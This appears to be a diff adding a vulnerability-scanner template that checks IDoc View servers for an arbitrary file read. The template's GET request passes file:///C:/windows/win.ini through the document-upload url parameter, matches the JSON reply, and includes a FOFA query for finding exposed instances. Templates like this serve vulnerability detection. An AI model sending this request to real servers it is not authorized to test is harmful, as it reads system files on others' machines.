@@ -1,0 +1,38 @@
+id: idocview-lfi
+
+info:
+  name: IDoc View - Arbitrary File Read
+  author: DhiyaneshDK
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title=="在线文档预览 - I Doc View"
+  tags: idoc,lfi,file-read,vuln
+
+variables:
+  file: "{{to_lower(rand_text_alpha(5))}}"
+
+http:
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name={{file}}.txt"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(content_type, 'application/json')
+          - contains_all(body, "ext", "srcUrl", "success", "md5")
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: filepath
+        group: 1
+        regex:
+          - '"srcUrl":"\/([a-z/0-9_.]+)"'
+# digest: 4b0a00483046022100dd75c8cb9f62f517284c6cbf7495ef18450f8e9db5e8fd99897e46dff09d278a022100a5a4f009d01cd0d6cb848e952e00eaf197eb146bb926ba8dd5b4af8f9501cfd2:922c64590222798bb761d5b6d8e72950
